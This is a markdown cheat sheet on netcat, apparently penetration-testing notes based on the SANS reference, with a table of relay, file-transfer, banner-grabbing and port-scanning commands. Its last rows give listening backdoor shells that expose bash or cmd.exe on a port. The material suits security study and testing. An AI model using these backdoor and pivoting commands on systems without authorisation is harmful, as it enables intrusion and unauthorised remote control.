# Netcat Usage

`netcat` is a command-line or shell application that can be used for a wide variety of exploitation matters including transferring files, establishing remote shells and more! The official netcat site is http://netcat.sourceforge.net and, although Sourceforge has this repository, most Unix/Linux operating systems have a netcat application that is/can be installed via their packagers (apt-get, ports, etc.).

The [SANS Institute](http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf) has a very good "Cheat Sheet" PDF for netcat commands and functions. Please **note** that "All syntax is designed for the original netcat versions, released by Hobbit and Weld Pond. The syntax here can be adapted for other netcats." So, you may need to modify the commands below. Please do check out their PDF.

## Relays on Linux
Before you do any of the Linux relays with netcat below, please do the following:
``$ cd /tmp``
``$ mknod backpipe p``

## Commands
| Command  | Category | Description / Importance |
| -------- | -------- | ------------------------ |
| `C:\> nc -l -p [LocalPort] -e relay.bat` <br> `C:\> echo nc [TargetIPaddr] [port] > relay.bat` | Relay - Windows | **Listener-to-Client Relay** - Create a relay that sends packets from the local port [LocalPort] to a netcat client connected to [TargetIPaddr] on port [port] |
| `$ nc -l -p [LocalPort] 0<backpipe` &#124; `nc [TargetIPaddr] [port]` &#124; `tee backpipe` | Relay - Linux | **Listener-to-Client Relay** - Create a relay that sends packets from the local port [LocalPort] to a netcat client connected to [TargetIPaddr] on port [port] |
| `C:\> echo nc -l -p [LocalPort_2] > relay.bat`<br>`C:\> nc -l -p [LocalPort_1] -e relay.bat` | Relay - Windows | **Listener-to-Listener Relay** - Create a relay that will send packets from any connection on {LocalPort_1] to any connection on [LocalPort_2] |
| `$ nc -l -p [LocalPort_1] 0<backpipe` &#124; `nc -l -p [LocalPort_2]` &#124; `tee backpipe` | Relay - Linux | **Listener-to-Listener Relay** - Create a relay that will send packets from any connection on {LocalPort_1] to any connection on [LocalPort_2] |
| `C:\> echo nc [NextHopIPaddr] [port2] > relay.bat`<br>`C:\> nc [PreviousHopIPaddr] [port] -e relay.bat` | Relay - Windows | **Client-to-Client Relay** - Create a relay that will send packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat Client connected to [NextHopIPaddr] on port [port2] |
| `$ nc [PreviousHopIPaddr] [port] 0<backpipe` &#124; `nc [NextHopIPaddr] [port2]` &#124; `tee backpipe` | Relay - Linux | **Client-to-Client Relay** - Create a relay that will send packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat Client connected to [NextHopIPaddr] on port [port2] |
| **Server:** `nc -w3 [TargetIPaddr] [port] < [infile]`<br>**Client:** `nc -l -p [LocalPort] > [outfile]` | File Transfer - All OS | Push [infile] to [TargetIPaddr] on [port] |
| **Server:** `nc -l -p [LocalPort] < [infile]`<br>**Client:** `nc -w3 [TargetIPaddr] [port] > [outfile]` | File Transfer - All OS | Connect to [TargetIPaddr] on [port] and retrieve [outfile] |
| `echo ""` &#124; `nc -v -n -w1 [TargetIPaddr] [start_port] [end_port]` | TCP Banner Grabber | Attempt to connect to each port in a range from [end_port] to [start_port] on [TargetIPaddr]. Then send a blank string to the open port and print out any banner received in response. | 
| `nc -v -n -z -w1 [TargetIPaddr] [start_port] [end_port]` | TCP Port Scanner | Attempt to connect to each port in a range from [end_port] tp [start_port] on IP address [TargetIPaddr]. |
| `$ nc -l -p [LocalPort] -e /bin/bash` | Backdoor - Linux | Listening backdoor shell for a Linux computer. Use a netcat client to connect to the target's IP address on the [LocalPort] and you will get a BASH shell. |
| `$ nc -l -p [LocalPort] -e cmd.exe` | Backdoor - Windows | Listening backdoor shell for a Windows computer. Use a netcat client to connect to the target's IP address on the [LocalPort] and you will get a CMD shell. |
